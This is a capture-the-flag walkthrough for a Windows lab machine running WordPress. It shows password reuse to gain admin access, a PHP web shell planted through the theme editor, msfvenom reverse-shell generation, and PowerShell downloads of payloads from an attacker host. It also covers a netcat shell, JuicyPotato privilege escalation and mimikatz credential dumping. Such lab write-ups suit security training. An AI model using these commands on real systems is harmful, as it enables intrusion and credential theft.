* [Recon-Enumeration](#recon-enumeration)
* [Exploit](#exploit)
* [Privesc](#privesc)
* [Discoveries](#discoveries)  
![alt text](./img/shield.PNG?raw=true)  

## Recon-Enumeration  
![alt text](./img/shield01.PNG?raw=true)  

![alt text](./img/shield02.PNG?raw=true)  

Looks like we have WORDPRESS, time to use WPSCAN  
![alt text](./img/shield03.PNG?raw=true)  
 
This scan will take a while, but after we receive some interesting results  
![alt text](./img/shield04.PNG?raw=true)  
  
![alt text](./img/shield05.PNG?raw=true)    

Ok, navigating through the blog we can find an interesting URL in source code:  
![alt text](./img/shield06.PNG?raw=true)    
  
When we try to access it we are redirect to another page. Maybe we can map the blog changing it value and following the redirect. Let’s try to automate this…
- for i in $(seq 1 100);do echo -n "$i - " && curl http://10.10.10.29/wordpress/?p=$i -i -s | grep Location;echo;done  
The result of this code return 100 lines, but these are the only ones with redirect  
![alt text](./img/shield07.PNG?raw=true)    

In the blog we can find an login page  
![alt text](./img/shield08.PNG?raw=true)    

We can try admin:admin, but it will fail  
![alt text](./img/shield09.PNG?raw=true)    

However the message says that the PASSWORD is incorrect for the username admin, so this username exists. We can try to use the password discovered on the other machines (archetype, oopsie, vaccine)

The credential admin:P@s5w0rd! worked!

## Exploit  
![alt text](./img/shield10.PNG?raw=true)    

From here we can go to APPEARANCE -> THEME EDITOR  
![alt text](./img/shield11.PNG?raw=true)    


The theme used is HIGHLIGHT, uselly the path for the pages in the right corner are:  
- WEBSITE/wp-content/themes/highlight/  
So for the PAGE single.php the url would be  
- 10.10.10.29/wp-content/themes/highlight/single.php

Now let’s edit the page single.php with and backdoor php code. I recommend use the one in the webshells folder:  
![alt text](./img/shield12.PNG?raw=true)    

Copy the php code and paste in the single.php, than UPDATE FILE  
![alt text](./img/shield13.PNG?raw=true)    

Now let’s access the page using the cmd param of the backdoor  
![alt text](./img/shield14.PNG?raw=true)    

Success! Now let’s try to get a shell… run the following command to generate an .exe file
- msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=1234 -f exe -e x86/shikata_ga_nai -i 9 -o reverse.exe
- Start a http server (Ex: sudo python3 -m http.server 80)
- Start an listener on port 123

In the browser access the url:
- http://10.10.10.29/wp-content/themes/highlight/single.php?cmd=powershell -c "(New-Object Net.Webclient).DownloadFile('http://YOUR_IP/reverse.exe','C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\reverse.exe')"

Now the file is in the same directory of the single.php page. To run the exe just access the follow link:
- http://10.10.10.29/wordpress/wp-content/themes/highlight/single.php?cmd=reverse.exe

You will receive an reverse shell  
![alt text](./img/shield15.PNG?raw=true)    

## Privesc  
![alt text](./img/shield20.PNG?raw=true)    
  
![alt text](./img/shield16.PNG?raw=true)    

So we have the SeImpersonatePrivilege ENABLED, [juicy potato](https://github.com/ohpe/juicy-potato) can help us with the privesc

Let’s upload nc64.exe and JuicyPotato.exe to the machine (don’t forget to set a http server)
- powershell -c "(New-Object Net.Webclient).DownloadFile('http://YOUR_IP/nc64.exe','C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\nc64.exe')"
- powershell -c "(New-Object Net.Webclient).DownloadFile('http://YOUR_IP/JuicyPotato.exe','C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\jp.exe')"  
PS: you can find the nc64.exe on internet, just google it (Tip: github)

Now we create a bat file, which will be executed by the juicypotato:
- echo start C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\nc64.exe -e cmd.exe YOUR_IP 9003 > eldruin.bat

To run the command we might need a clsid, for luck we can grab one [here](http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/)

Now set up the nc listener on port 9003 and run the command:
- jp.exe -p C:\inetpub\wwwroot\wordpress\wp-content\themes\highlight\eldruin.bat -l 9003 -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}  
![alt text](./img/shield18.PNG?raw=true)    
  
![alt text](./img/shield19.PNG?raw=true)    

Now just go to C:\Users\Administrator\Desktop and get the flag

## Discoveries  
![alt text](./img/shield17.PNG?raw=true)    

Upload mimikatz to the machine and run the command:
- sekurlsa::logonpasswords  
![alt text](./img/shield21.PNG?raw=true)    

